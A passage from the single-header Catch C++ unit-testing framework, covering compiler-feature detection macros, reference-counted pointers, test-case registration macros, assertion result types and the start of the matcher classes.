#       pragma clang diagnostic ignored "-Wcovered-switch-default"
#    endif
#elif defined __GNUC__
#    pragma GCC diagnostic ignored "-Wvariadic-macros"
#    pragma GCC diagnostic ignored "-Wunused-variable"
#    pragma GCC diagnostic push
#    pragma GCC diagnostic ignored "-Wpadded"
#endif
#if defined(CATCH_CONFIG_MAIN) || defined(CATCH_CONFIG_RUNNER)
#  define CATCH_IMPL
#endif

#ifdef CATCH_IMPL
#  ifndef CLARA_CONFIG_MAIN
#    define CLARA_CONFIG_MAIN_NOT_DEFINED
#    define CLARA_CONFIG_MAIN
#  endif
#endif

// #included from: internal/catch_notimplemented_exception.h
#define TWOBLUECUBES_CATCH_NOTIMPLEMENTED_EXCEPTION_H_INCLUDED

// #included from: catch_common.h
#define TWOBLUECUBES_CATCH_COMMON_H_INCLUDED

#define INTERNAL_CATCH_UNIQUE_NAME_LINE2( name, line ) name##line
#define INTERNAL_CATCH_UNIQUE_NAME_LINE( name, line ) INTERNAL_CATCH_UNIQUE_NAME_LINE2( name, line )
#ifdef CATCH_CONFIG_COUNTER
#  define INTERNAL_CATCH_UNIQUE_NAME( name ) INTERNAL_CATCH_UNIQUE_NAME_LINE( name, __COUNTER__ )
#else
#  define INTERNAL_CATCH_UNIQUE_NAME( name ) INTERNAL_CATCH_UNIQUE_NAME_LINE( name, __LINE__ )
#endif

#define INTERNAL_CATCH_STRINGIFY2( expr ) #expr
#define INTERNAL_CATCH_STRINGIFY( expr ) INTERNAL_CATCH_STRINGIFY2( expr )

#include <sstream>
#include <stdexcept>
#include <algorithm>

// #included from: catch_compiler_capabilities.h
#define TWOBLUECUBES_CATCH_COMPILER_CAPABILITIES_HPP_INCLUDED

// Detect a number of compiler features - mostly C++11/14 conformance - by compiler
// The following features are defined:
//
// CATCH_CONFIG_CPP11_NULLPTR : is nullptr supported?
// CATCH_CONFIG_CPP11_NOEXCEPT : is noexcept supported?
// CATCH_CONFIG_CPP11_GENERATED_METHODS : The delete and default keywords for compiler generated methods
// CATCH_CONFIG_CPP11_IS_ENUM : std::is_enum is supported?
// CATCH_CONFIG_CPP11_TUPLE : std::tuple is supported
// CATCH_CONFIG_CPP11_LONG_LONG : is long long supported?
// CATCH_CONFIG_CPP11_OVERRIDE : is override supported?
// CATCH_CONFIG_CPP11_UNIQUE_PTR : is unique_ptr supported (otherwise use auto_ptr)

// CATCH_CONFIG_CPP11_OR_GREATER : Is C++11 supported?

// CATCH_CONFIG_VARIADIC_MACROS : are variadic macros supported?
// CATCH_CONFIG_COUNTER : is the __COUNTER__ macro supported?
// ****************
// Note to maintainers: if new toggles are added please document them
// in configuration.md, too
// ****************

// In general each macro has a _NO_<feature name> form
// (e.g. CATCH_CONFIG_CPP11_NO_NULLPTR) which disables the feature.
// Many features, at point of detection, define an _INTERNAL_ macro, so they
// can be combined, en-mass, with the _NO_ forms later.

// All the C++11 features can be disabled with CATCH_CONFIG_NO_CPP11

#if defined(__cplusplus) && __cplusplus >= 201103L
#  define CATCH_CPP11_OR_GREATER
#endif

#ifdef __clang__

#  if __has_feature(cxx_nullptr)
#    define CATCH_INTERNAL_CONFIG_CPP11_NULLPTR
#  endif

#  if __has_feature(cxx_noexcept)
#    define CATCH_INTERNAL_CONFIG_CPP11_NOEXCEPT
#  endif

#   if defined(CATCH_CPP11_OR_GREATER)
#       define CATCH_INTERNAL_SUPPRESS_PARENTHESES_WARNINGS _Pragma( "clang diagnostic ignored \"-Wparentheses\"" )
#   endif

#endif // __clang__

////////////////////////////////////////////////////////////////////////////////
// Borland
#ifdef __BORLANDC__

#endif // __BORLANDC__

////////////////////////////////////////////////////////////////////////////////
// EDG
#ifdef __EDG_VERSION__

#endif // __EDG_VERSION__

////////////////////////////////////////////////////////////////////////////////
// Digital Mars
#ifdef __DMC__

#endif // __DMC__

////////////////////////////////////////////////////////////////////////////////
// GCC
#ifdef __GNUC__

#   if __GNUC__ == 4 && __GNUC_MINOR__ >= 6 && defined(__GXX_EXPERIMENTAL_CXX0X__)
#       define CATCH_INTERNAL_CONFIG_CPP11_NULLPTR
#   endif

#   if !defined(CATCH_INTERNAL_SUPPRESS_PARENTHESES_WARNINGS) && defined(CATCH_CPP11_OR_GREATER)
#       define CATCH_INTERNAL_SUPPRESS_PARENTHESES_WARNINGS _Pragma( "GCC diagnostic ignored \"-Wparentheses\"" )
#   endif

// - otherwise more recent versions define __cplusplus >= 201103L
// and will get picked up below

#endif // __GNUC__

////////////////////////////////////////////////////////////////////////////////
// Visual C++
#ifdef _MSC_VER

#if (_MSC_VER >= 1600)
#   define CATCH_INTERNAL_CONFIG_CPP11_NULLPTR
#   define CATCH_INTERNAL_CONFIG_CPP11_UNIQUE_PTR
#endif

#if (_MSC_VER >= 1900 ) // (VC++ 13 (VS2015))
#define CATCH_INTERNAL_CONFIG_CPP11_NOEXCEPT
#define CATCH_INTERNAL_CONFIG_CPP11_GENERATED_METHODS
#endif

#endif // _MSC_VER

////////////////////////////////////////////////////////////////////////////////

// Use variadic macros if the compiler supports them
#if ( defined _MSC_VER && _MSC_VER > 1400 && !defined __EDGE__) || \
    ( defined __WAVE__ && __WAVE_HAS_VARIADICS ) || \
    ( defined __GNUC__ && __GNUC__ >= 3 ) || \
    ( !defined __cplusplus && __STDC_VERSION__ >= 199901L || __cplusplus >= 201103L )

#define CATCH_INTERNAL_CONFIG_VARIADIC_MACROS

#endif

// Use __COUNTER__ if the compiler supports it
#if ( defined _MSC_VER && _MSC_VER >= 1300 ) || \
    ( defined __GNUC__  && __GNUC__ >= 4 && __GNUC_MINOR__ >= 3 ) || \
    ( defined __clang__ && __clang_major__ >= 3 )

#define CATCH_INTERNAL_CONFIG_COUNTER

#endif

////////////////////////////////////////////////////////////////////////////////
// C++ language feature support

// catch all support for C++11
#if defined(CATCH_CPP11_OR_GREATER)

#  if !defined(CATCH_INTERNAL_CONFIG_CPP11_NULLPTR)
#    define CATCH_INTERNAL_CONFIG_CPP11_NULLPTR
#  endif

#  ifndef CATCH_INTERNAL_CONFIG_CPP11_NOEXCEPT
#    define CATCH_INTERNAL_CONFIG_CPP11_NOEXCEPT
#  endif

#  ifndef CATCH_INTERNAL_CONFIG_CPP11_GENERATED_METHODS
#    define CATCH_INTERNAL_CONFIG_CPP11_GENERATED_METHODS
#  endif

#  ifndef CATCH_INTERNAL_CONFIG_CPP11_IS_ENUM
#    define CATCH_INTERNAL_CONFIG_CPP11_IS_ENUM
#  endif

#  ifndef CATCH_INTERNAL_CONFIG_CPP11_TUPLE
#    define CATCH_INTERNAL_CONFIG_CPP11_TUPLE
#  endif

#  ifndef CATCH_INTERNAL_CONFIG_VARIADIC_MACROS
#    define CATCH_INTERNAL_CONFIG_VARIADIC_MACROS
#  endif

#  if !defined(CATCH_INTERNAL_CONFIG_CPP11_LONG_LONG)
#    define CATCH_INTERNAL_CONFIG_CPP11_LONG_LONG
#  endif

#  if !defined(CATCH_INTERNAL_CONFIG_CPP11_OVERRIDE)
#    define CATCH_INTERNAL_CONFIG_CPP11_OVERRIDE
#  endif
#  if !defined(CATCH_INTERNAL_CONFIG_CPP11_UNIQUE_PTR)
#    define CATCH_INTERNAL_CONFIG_CPP11_UNIQUE_PTR
#  endif

#endif // __cplusplus >= 201103L

// Now set the actual defines based on the above + anything the user has configured
#if defined(CATCH_INTERNAL_CONFIG_CPP11_NULLPTR) && !defined(CATCH_CONFIG_CPP11_NO_NULLPTR) && !defined(CATCH_CONFIG_CPP11_NULLPTR) && !defined(CATCH_CONFIG_NO_CPP11)
#   define CATCH_CONFIG_CPP11_NULLPTR
#endif
#if defined(CATCH_INTERNAL_CONFIG_CPP11_NOEXCEPT) && !defined(CATCH_CONFIG_CPP11_NO_NOEXCEPT) && !defined(CATCH_CONFIG_CPP11_NOEXCEPT) && !defined(CATCH_CONFIG_NO_CPP11)
#   define CATCH_CONFIG_CPP11_NOEXCEPT
#endif
#if defined(CATCH_INTERNAL_CONFIG_CPP11_GENERATED_METHODS) && !defined(CATCH_CONFIG_CPP11_NO_GENERATED_METHODS) && !defined(CATCH_CONFIG_CPP11_GENERATED_METHODS) && !defined(CATCH_CONFIG_NO_CPP11)
#   define CATCH_CONFIG_CPP11_GENERATED_METHODS
#endif
#if defined(CATCH_INTERNAL_CONFIG_CPP11_IS_ENUM) && !defined(CATCH_CONFIG_CPP11_NO_IS_ENUM) && !defined(CATCH_CONFIG_CPP11_IS_ENUM) && !defined(CATCH_CONFIG_NO_CPP11)
#   define CATCH_CONFIG_CPP11_IS_ENUM
#endif
#if defined(CATCH_INTERNAL_CONFIG_CPP11_TUPLE) && !defined(CATCH_CONFIG_CPP11_NO_TUPLE) && !defined(CATCH_CONFIG_CPP11_TUPLE) && !defined(CATCH_CONFIG_NO_CPP11)
#   define CATCH_CONFIG_CPP11_TUPLE
#endif
#if defined(CATCH_INTERNAL_CONFIG_VARIADIC_MACROS) && !defined(CATCH_CONFIG_NO_VARIADIC_MACROS) && !defined(CATCH_CONFIG_VARIADIC_MACROS)
#   define CATCH_CONFIG_VARIADIC_MACROS
#endif
#if defined(CATCH_INTERNAL_CONFIG_CPP11_LONG_LONG) && !defined(CATCH_CONFIG_NO_LONG_LONG) && !defined(CATCH_CONFIG_CPP11_LONG_LONG) && !defined(CATCH_CONFIG_NO_CPP11)
#   define CATCH_CONFIG_CPP11_LONG_LONG
#endif
#if defined(CATCH_INTERNAL_CONFIG_CPP11_OVERRIDE) && !defined(CATCH_CONFIG_NO_OVERRIDE) && !defined(CATCH_CONFIG_CPP11_OVERRIDE) && !defined(CATCH_CONFIG_NO_CPP11)
#   define CATCH_CONFIG_CPP11_OVERRIDE
#endif
#if defined(CATCH_INTERNAL_CONFIG_CPP11_UNIQUE_PTR) && !defined(CATCH_CONFIG_NO_UNIQUE_PTR) && !defined(CATCH_CONFIG_CPP11_UNIQUE_PTR) && !defined(CATCH_CONFIG_NO_CPP11)
#   define CATCH_CONFIG_CPP11_UNIQUE_PTR
#endif
#if defined(CATCH_INTERNAL_CONFIG_COUNTER) && !defined(CATCH_CONFIG_NO_COUNTER) && !defined(CATCH_CONFIG_COUNTER)
#   define CATCH_CONFIG_COUNTER
#endif

#if !defined(CATCH_INTERNAL_SUPPRESS_PARENTHESES_WARNINGS)
#   define CATCH_INTERNAL_SUPPRESS_PARENTHESES_WARNINGS
#endif

// noexcept support:
#if defined(CATCH_CONFIG_CPP11_NOEXCEPT) && !defined(CATCH_NOEXCEPT)
#  define CATCH_NOEXCEPT noexcept
#  define CATCH_NOEXCEPT_IS(x) noexcept(x)
#else
#  define CATCH_NOEXCEPT throw()
#  define CATCH_NOEXCEPT_IS(x)
#endif

// nullptr support
#ifdef CATCH_CONFIG_CPP11_NULLPTR
#   define CATCH_NULL nullptr
#else
#   define CATCH_NULL NULL
#endif

// override support
#ifdef CATCH_CONFIG_CPP11_OVERRIDE
#   define CATCH_OVERRIDE override
#else
#   define CATCH_OVERRIDE
#endif

// unique_ptr support
#ifdef CATCH_CONFIG_CPP11_UNIQUE_PTR
#   define CATCH_AUTO_PTR( T ) std::unique_ptr<T>
#else
#   define CATCH_AUTO_PTR( T ) std::auto_ptr<T>
#endif

namespace Catch {

	struct IConfig;

	struct CaseSensitive {
		enum Choice {
			Yes,
			No
		};
	};

	class NonCopyable {
#ifdef CATCH_CONFIG_CPP11_GENERATED_METHODS
		NonCopyable(NonCopyable const&) = delete;
		NonCopyable(NonCopyable &&) = delete;
		NonCopyable& operator = (NonCopyable const&) = delete;
		NonCopyable& operator = (NonCopyable &&) = delete;
#else
		NonCopyable(NonCopyable const& info);
		NonCopyable& operator = (NonCopyable const&);
#endif

	protected:
		NonCopyable() {}
		virtual ~NonCopyable();
	};

	class SafeBool {
	public:
		typedef void (SafeBool::*type)() const;

		static type makeSafe(bool value) {
			return value ? &SafeBool::trueValue : 0;
		}
	private:
		void trueValue() const {}
	};

	template<typename ContainerT>
	inline void deleteAll(ContainerT& container) {
		typename ContainerT::const_iterator it = container.begin();
		typename ContainerT::const_iterator itEnd = container.end();
		for (; it != itEnd; ++it)
			delete *it;
	}
	template<typename AssociativeContainerT>
	inline void deleteAllValues(AssociativeContainerT& container) {
		typename AssociativeContainerT::const_iterator it = container.begin();
		typename AssociativeContainerT::const_iterator itEnd = container.end();
		for (; it != itEnd; ++it)
			delete it->second;
	}

	bool startsWith(std::string const& s, std::string const& prefix);
	bool endsWith(std::string const& s, std::string const& suffix);
	bool contains(std::string const& s, std::string const& infix);
	void toLowerInPlace(std::string& s);
	std::string toLower(std::string const& s);
	std::string trim(std::string const& str);
	bool replaceInPlace(std::string& str, std::string const& replaceThis, std::string const& withThis);

	struct pluralise {
		pluralise(std::size_t count, std::string const& label);

		friend std::ostream& operator << (std::ostream& os, pluralise const& pluraliser);

		std::size_t m_count;
		std::string m_label;
	};

	struct SourceLineInfo {

		SourceLineInfo();
		SourceLineInfo(char const* _file, std::size_t _line);
		SourceLineInfo(SourceLineInfo const& other);
#  ifdef CATCH_CONFIG_CPP11_GENERATED_METHODS
		SourceLineInfo(SourceLineInfo &&) = default;
		SourceLineInfo& operator = (SourceLineInfo const&) = default;
		SourceLineInfo& operator = (SourceLineInfo &&) = default;
#  endif
		bool empty() const;
		bool operator == (SourceLineInfo const& other) const;
		bool operator < (SourceLineInfo const& other) const;

		std::string file;
		std::size_t line;
	};

	std::ostream& operator << (std::ostream& os, SourceLineInfo const& info);

	// This is just here to avoid compiler warnings with macro constants and boolean literals
	inline bool isTrue(bool value) { return value; }
	inline bool alwaysTrue() { return true; }
	inline bool alwaysFalse() { return false; }

	void throwLogicError(std::string const& message, SourceLineInfo const& locationInfo);

	void seedRng(IConfig const& config);
	unsigned int rngSeed();

	// Use this in variadic streaming macros to allow
	//    >> +StreamEndStop
	// as well as
	//    >> stuff +StreamEndStop
	struct StreamEndStop {
		std::string operator+() {
			return std::string();
		}
	};
	template<typename T>
	T const& operator + (T const& value, StreamEndStop) {
		return value;
	}
}

#define CATCH_INTERNAL_LINEINFO ::Catch::SourceLineInfo( __FILE__, static_cast<std::size_t>( __LINE__ ) )
#define CATCH_INTERNAL_ERROR( msg ) ::Catch::throwLogicError( msg, CATCH_INTERNAL_LINEINFO );

#include <ostream>

namespace Catch {

	class NotImplementedException : public std::exception
	{
	public:
		NotImplementedException(SourceLineInfo const& lineInfo);
		NotImplementedException(NotImplementedException const&) {}

		virtual ~NotImplementedException() CATCH_NOEXCEPT {}

		virtual const char* what() const CATCH_NOEXCEPT;

	private:
		std::string m_what;
		SourceLineInfo m_lineInfo;
	};

} // end namespace Catch

  ///////////////////////////////////////////////////////////////////////////////
#define CATCH_NOT_IMPLEMENTED throw Catch::NotImplementedException( CATCH_INTERNAL_LINEINFO )

  // #included from: internal/catch_context.h
#define TWOBLUECUBES_CATCH_CONTEXT_H_INCLUDED

  // #included from: catch_interfaces_generators.h
#define TWOBLUECUBES_CATCH_INTERFACES_GENERATORS_H_INCLUDED

#include <string>

namespace Catch {

	struct IGeneratorInfo {
		virtual ~IGeneratorInfo();
		virtual bool moveNext() = 0;
		virtual std::size_t getCurrentIndex() const = 0;
	};

	struct IGeneratorsForTest {
		virtual ~IGeneratorsForTest();

		virtual IGeneratorInfo& getGeneratorInfo(std::string const& fileInfo, std::size_t size) = 0;
		virtual bool moveNext() = 0;
	};

	IGeneratorsForTest* createGeneratorsForTest();

} // end namespace Catch

  // #included from: catch_ptr.hpp
#define TWOBLUECUBES_CATCH_PTR_HPP_INCLUDED

#ifdef __clang__
#pragma clang diagnostic push
#pragma clang diagnostic ignored "-Wpadded"
#endif

namespace Catch {

	// An intrusive reference counting smart pointer.
	// T must implement addRef() and release() methods
	// typically implementing the IShared interface
	template<typename T>
	class Ptr {
	public:
		Ptr() : m_p(CATCH_NULL) {}
		Ptr(T* p) : m_p(p) {
			if (m_p)
				m_p->addRef();
		}
		Ptr(Ptr const& other) : m_p(other.m_p) {
			if (m_p)
				m_p->addRef();
		}
		~Ptr() {
			if (m_p)
				m_p->release();
		}
		void reset() {
			if (m_p)
				m_p->release();
			m_p = CATCH_NULL;
		}
		Ptr& operator = (T* p) {
			Ptr temp(p);
			swap(temp);
			return *this;
		}
		Ptr& operator = (Ptr const& other) {
			Ptr temp(other);
			swap(temp);
			return *this;
		}
		void swap(Ptr& other) { std::swap(m_p, other.m_p); }
		T* get() const { return m_p; }
		T& operator*() const { return *m_p; }
		T* operator->() const { return m_p; }
		bool operator !() const { return m_p == CATCH_NULL; }
		operator SafeBool::type() const { return SafeBool::makeSafe(m_p != CATCH_NULL); }

	private:
		T* m_p;
	};

	struct IShared : NonCopyable {
		virtual ~IShared();
		virtual void addRef() const = 0;
		virtual void release() const = 0;
	};

	template<typename T = IShared>
	struct SharedImpl : T {

		SharedImpl() : m_rc(0) {}

		virtual void addRef() const {
			++m_rc;
		}
		virtual void release() const {
			if (--m_rc == 0)
				delete this;
		}

		mutable unsigned int m_rc;
	};

} // end namespace Catch

#ifdef __clang__
#pragma clang diagnostic pop
#endif

#include <memory>
#include <vector>
#include <stdlib.h>

namespace Catch {

	class TestCase;
	class Stream;
	struct IResultCapture;
	struct IRunner;
	struct IGeneratorsForTest;
	struct IConfig;

	struct IContext
	{
		virtual ~IContext();

		virtual IResultCapture* getResultCapture() = 0;
		virtual IRunner* getRunner() = 0;
		virtual size_t getGeneratorIndex(std::string const& fileInfo, size_t totalSize) = 0;
		virtual bool advanceGeneratorsForCurrentTest() = 0;
		virtual Ptr<IConfig const> getConfig() const = 0;
	};

	struct IMutableContext : IContext
	{
		virtual ~IMutableContext();
		virtual void setResultCapture(IResultCapture* resultCapture) = 0;
		virtual void setRunner(IRunner* runner) = 0;
		virtual void setConfig(Ptr<IConfig const> const& config) = 0;
	};

	IContext& getCurrentContext();
	IMutableContext& getCurrentMutableContext();
	void cleanUpContext();
	Stream createStream(std::string const& streamName);

}

// #included from: internal/catch_test_registry.hpp
#define TWOBLUECUBES_CATCH_TEST_REGISTRY_HPP_INCLUDED

// #included from: catch_interfaces_testcase.h
#define TWOBLUECUBES_CATCH_INTERFACES_TESTCASE_H_INCLUDED

#include <vector>

namespace Catch {

	class TestSpec;

	struct ITestCase : IShared {
		virtual void invoke() const = 0;
	protected:
		virtual ~ITestCase();
	};

	class TestCase;
	struct IConfig;

	struct ITestCaseRegistry {
		virtual ~ITestCaseRegistry();
		virtual std::vector<TestCase> const& getAllTests() const = 0;
		virtual std::vector<TestCase> const& getAllTestsSorted(IConfig const& config) const = 0;
	};

	bool matchTest(TestCase const& testCase, TestSpec const& testSpec, IConfig const& config);
	std::vector<TestCase> filterTests(std::vector<TestCase> const& testCases, TestSpec const& testSpec, IConfig const& config);
	std::vector<TestCase> const& getAllTestCasesSorted(IConfig const& config);

}

namespace Catch {

	template<typename C>
	class MethodTestCase : public SharedImpl<ITestCase> {

	public:
		MethodTestCase(void (C::*method)()) : m_method(method) {}

		virtual void invoke() const {
			C obj;
			(obj.*m_method)();
		}

	private:
		virtual ~MethodTestCase() {}

		void (C::*m_method)();
	};

	typedef void(*TestFunction)();

	struct NameAndDesc {
		NameAndDesc(const char* _name = "", const char* _description = "")
			: name(_name), description(_description)
		{}

		const char* name;
		const char* description;
	};

	void registerTestCase
	(ITestCase* testCase,
		char const* className,
		NameAndDesc const& nameAndDesc,
		SourceLineInfo const& lineInfo);

	struct AutoReg {

		AutoReg
		(TestFunction function,
			SourceLineInfo const& lineInfo,
			NameAndDesc const& nameAndDesc);

		template<typename C>
		AutoReg
		(void (C::*method)(),
			char const* className,
			NameAndDesc const& nameAndDesc,
			SourceLineInfo const& lineInfo) {

			registerTestCase
			(new MethodTestCase<C>(method),
				className,
				nameAndDesc,
				lineInfo);
		}

		~AutoReg();

	private:
		AutoReg(AutoReg const&);
		void operator= (AutoReg const&);
	};

	void registerTestCaseFunction
	(TestFunction function,
		SourceLineInfo const& lineInfo,
		NameAndDesc const& nameAndDesc);

} // end namespace Catch

#ifdef CATCH_CONFIG_VARIADIC_MACROS
  ///////////////////////////////////////////////////////////////////////////////
#define INTERNAL_CATCH_TESTCASE2( TestName, ... ) \
        static void TestName(); \
        namespace{ Catch::AutoReg INTERNAL_CATCH_UNIQUE_NAME( autoRegistrar )( &TestName, CATCH_INTERNAL_LINEINFO, Catch::NameAndDesc( __VA_ARGS__ ) ); }\
        static void TestName()
#define INTERNAL_CATCH_TESTCASE( ... ) \
        INTERNAL_CATCH_TESTCASE2( INTERNAL_CATCH_UNIQUE_NAME( ____C_A_T_C_H____T_E_S_T____ ), __VA_ARGS__ )

  ///////////////////////////////////////////////////////////////////////////////
#define INTERNAL_CATCH_METHOD_AS_TEST_CASE( QualifiedMethod, ... ) \
        namespace{ Catch::AutoReg INTERNAL_CATCH_UNIQUE_NAME( autoRegistrar )( &QualifiedMethod, "&" #QualifiedMethod, Catch::NameAndDesc( __VA_ARGS__ ), CATCH_INTERNAL_LINEINFO ); }

  ///////////////////////////////////////////////////////////////////////////////
#define INTERNAL_CATCH_TEST_CASE_METHOD2( TestName, ClassName, ... )\
        namespace{ \
            struct TestName : ClassName{ \
                void test(); \
            }; \
            Catch::AutoReg INTERNAL_CATCH_UNIQUE_NAME( autoRegistrar ) ( &TestName::test, #ClassName, Catch::NameAndDesc( __VA_ARGS__ ), CATCH_INTERNAL_LINEINFO ); \
        } \
        void TestName::test()
#define INTERNAL_CATCH_TEST_CASE_METHOD( ClassName, ... ) \
        INTERNAL_CATCH_TEST_CASE_METHOD2( INTERNAL_CATCH_UNIQUE_NAME( ____C_A_T_C_H____T_E_S_T____ ), ClassName, __VA_ARGS__ )

  ///////////////////////////////////////////////////////////////////////////////
#define INTERNAL_CATCH_REGISTER_TESTCASE( Function, ... ) \
        Catch::AutoReg( Function, CATCH_INTERNAL_LINEINFO, Catch::NameAndDesc( __VA_ARGS__ ) );

#else
  ///////////////////////////////////////////////////////////////////////////////
#define INTERNAL_CATCH_TESTCASE2( TestName, Name, Desc ) \
        static void TestName(); \
        namespace{ Catch::AutoReg INTERNAL_CATCH_UNIQUE_NAME( autoRegistrar )( &TestName, CATCH_INTERNAL_LINEINFO, Catch::NameAndDesc( Name, Desc ) ); }\
        static void TestName()
#define INTERNAL_CATCH_TESTCASE( Name, Desc ) \
        INTERNAL_CATCH_TESTCASE2( INTERNAL_CATCH_UNIQUE_NAME( ____C_A_T_C_H____T_E_S_T____ ), Name, Desc )

  ///////////////////////////////////////////////////////////////////////////////
#define INTERNAL_CATCH_METHOD_AS_TEST_CASE( QualifiedMethod, Name, Desc ) \
        namespace{ Catch::AutoReg INTERNAL_CATCH_UNIQUE_NAME( autoRegistrar )( &QualifiedMethod, "&" #QualifiedMethod, Catch::NameAndDesc( Name, Desc ), CATCH_INTERNAL_LINEINFO ); }

  ///////////////////////////////////////////////////////////////////////////////
#define INTERNAL_CATCH_TEST_CASE_METHOD2( TestCaseName, ClassName, TestName, Desc )\
        namespace{ \
            struct TestCaseName : ClassName{ \
                void test(); \
            }; \
            Catch::AutoReg INTERNAL_CATCH_UNIQUE_NAME( autoRegistrar ) ( &TestCaseName::test, #ClassName, Catch::NameAndDesc( TestName, Desc ), CATCH_INTERNAL_LINEINFO ); \
        } \
        void TestCaseName::test()
#define INTERNAL_CATCH_TEST_CASE_METHOD( ClassName, TestName, Desc )\
        INTERNAL_CATCH_TEST_CASE_METHOD2( INTERNAL_CATCH_UNIQUE_NAME( ____C_A_T_C_H____T_E_S_T____ ), ClassName, TestName, Desc )

  ///////////////////////////////////////////////////////////////////////////////
#define INTERNAL_CATCH_REGISTER_TESTCASE( Function, Name, Desc ) \
        Catch::AutoReg( Function, CATCH_INTERNAL_LINEINFO, Catch::NameAndDesc( Name, Desc ) );
#endif

  // #included from: internal/catch_capture.hpp
#define TWOBLUECUBES_CATCH_CAPTURE_HPP_INCLUDED

  // #included from: catch_result_builder.h
#define TWOBLUECUBES_CATCH_RESULT_BUILDER_H_INCLUDED

  // #included from: catch_result_type.h
#define TWOBLUECUBES_CATCH_RESULT_TYPE_H_INCLUDED

namespace Catch {

	// ResultWas::OfType enum
	struct ResultWas {
		enum OfType {
			Unknown = -1,
			Ok = 0,
			Info = 1,
			Warning = 2,

			FailureBit = 0x10,

			ExpressionFailed = FailureBit | 1,
			ExplicitFailure = FailureBit | 2,

			Exception = 0x100 | FailureBit,

			ThrewException = Exception | 1,
			DidntThrowException = Exception | 2,

			FatalErrorCondition = 0x200 | FailureBit

		};
	};

	inline bool isOk(ResultWas::OfType resultType) {
		return (resultType & ResultWas::FailureBit) == 0;
	}
	inline bool isJustInfo(int flags) {
		return flags == ResultWas::Info;
	}

	// ResultDisposition::Flags enum
	struct ResultDisposition {
		enum Flags {
			Normal = 0x01,

			ContinueOnFailure = 0x02,   // Failures fail test, but execution continues
			FalseTest = 0x04,           // Prefix expression with !
			SuppressFail = 0x08         // Failures are reported but do not fail the test
		};
	};

	inline ResultDisposition::Flags operator | (ResultDisposition::Flags lhs, ResultDisposition::Flags rhs) {
		return static_cast<ResultDisposition::Flags>(static_cast<int>(lhs) | static_cast<int>(rhs));
	}

	inline bool shouldContinueOnFailure(int flags) { return (flags & ResultDisposition::ContinueOnFailure) != 0; }
	inline bool isFalseTest(int flags) { return (flags & ResultDisposition::FalseTest) != 0; }
	inline bool shouldSuppressFailure(int flags) { return (flags & ResultDisposition::SuppressFail) != 0; }

} // end namespace Catch

  // #included from: catch_assertionresult.h
#define TWOBLUECUBES_CATCH_ASSERTIONRESULT_H_INCLUDED

#include <string>

namespace Catch {

	struct AssertionInfo
	{
		AssertionInfo() {}
		AssertionInfo(std::string const& _macroName,
			SourceLineInfo const& _lineInfo,
			std::string const& _capturedExpression,
			ResultDisposition::Flags _resultDisposition);

		std::string macroName;
		SourceLineInfo lineInfo;
		std::string capturedExpression;
		ResultDisposition::Flags resultDisposition;
	};

	struct AssertionResultData
	{
		AssertionResultData() : resultType(ResultWas::Unknown) {}

		std::string reconstructedExpression;
		std::string message;
		ResultWas::OfType resultType;
	};

	class AssertionResult {
	public:
		AssertionResult();
		AssertionResult(AssertionInfo const& info, AssertionResultData const& data);
		~AssertionResult();
#  ifdef CATCH_CONFIG_CPP11_GENERATED_METHODS
		AssertionResult(AssertionResult const&) = default;
		AssertionResult(AssertionResult &&) = default;
		AssertionResult& operator = (AssertionResult const&) = default;
		AssertionResult& operator = (AssertionResult &&) = default;
#  endif

		bool isOk() const;
		bool succeeded() const;
		ResultWas::OfType getResultType() const;
		bool hasExpression() const;
		bool hasMessage() const;
		std::string getExpression() const;
		std::string getExpressionInMacro() const;
		bool hasExpandedExpression() const;
		std::string getExpandedExpression() const;
		std::string getMessage() const;
		SourceLineInfo getSourceInfo() const;
		std::string getTestMacroName() const;

	protected:
		AssertionInfo m_info;
		AssertionResultData m_resultData;
	};

} // end namespace Catch

  // #included from: catch_matchers.hpp
#define TWOBLUECUBES_CATCH_MATCHERS_HPP_INCLUDED

namespace Catch {
	namespace Matchers {
		namespace Impl {

			namespace Generic {
				template<typename ExpressionT> class AllOf;
				template<typename ExpressionT> class AnyOf;
				template<typename ExpressionT> class Not;
			}

			template<typename ExpressionT>
			struct Matcher : SharedImpl<IShared>
			{
				typedef ExpressionT ExpressionType;

				virtual ~Matcher() {}
				virtual Ptr<Matcher> clone() const = 0;
				virtual bool match(ExpressionT const& expr) const = 0;
				virtual std::string toString() const = 0;

				Generic::AllOf<ExpressionT> operator && (Matcher<ExpressionT> const& other) const;
				Generic::AnyOf<ExpressionT> operator || (Matcher<ExpressionT> const& other) const;
				Generic::Not<ExpressionT> operator ! () const;
			};

			template<typename DerivedT, typename ExpressionT>
			struct MatcherImpl : Matcher<ExpressionT> {

				virtual Ptr<Matcher<ExpressionT> > clone() const {
					return Ptr<Matcher<ExpressionT> >(new DerivedT(static_cast<DerivedT const&>(*this)));
				}
			};

			namespace Generic {
				template<typename ExpressionT>
				class Not : public MatcherImpl<Not<ExpressionT>, ExpressionT> {
				public:
					explicit Not(Matcher<ExpressionT> const& matcher) : m_matcher(matcher.clone()) {}
					Not(Not const& other) : m_matcher(other.m_matcher) {}

					virtual bool match(ExpressionT const& expr) const CATCH_OVERRIDE {
						return !m_matcher->match(expr);
					}

					virtual std::string toString() const CATCH_OVERRIDE {
						return "not " + m_matcher->toString();
					}
				private:
					Ptr< Matcher<ExpressionT> > m_matcher;
				};

				template<typename ExpressionT>
				class AllOf : public MatcherImpl<AllOf<ExpressionT>, ExpressionT> {
				public:

					AllOf() {}
					AllOf(AllOf const& other) : m_matchers(other.m_matchers) {}

					AllOf& add(Matcher<ExpressionT> const& matcher) {
						m_matchers.push_back(matcher.clone());
						return *this;
					}
					virtual bool match(ExpressionT const& expr) const
					{
						for (std::size_t i = 0; i < m_matchers.size(); ++i)
							if (!m_matchers[i]->match(expr))
								return false;
						return true;
					}
					virtual std::string toString() const {
						std::ostringstream oss;
						oss << "( ";
						for (std::size_t i = 0; i < m_matchers.size(); ++i) {
							if (i != 0)
								oss << " and ";
							oss << m_matchers[i]->toString();
						}
						oss << " )";
						return oss.str();
					}

					AllOf operator && (Matcher<ExpressionT> const& other) const {
						AllOf allOfExpr(*this);
						allOfExpr.add(other);
						return allOfExpr;
					}

				private:
					std::vector<Ptr<Matcher<ExpressionT> > > m_matchers;
				};

				template<typename ExpressionT>
				class AnyOf : public MatcherImpl<AnyOf<ExpressionT>, ExpressionT> {
				public:

					AnyOf() {}
					AnyOf(AnyOf const& other) : m_matchers(other.m_matchers) {}

					AnyOf& add(Matcher<ExpressionT> const& matcher) {
						m_matchers.push_back(matcher.clone());
						return *this;
					}
					virtual bool match(ExpressionT const& expr) const
					{
						for (std::size_t i = 0; i < m_matchers.size(); ++i)
							if (m_matchers[i]->match(expr))
								return true;
						return false;
					}
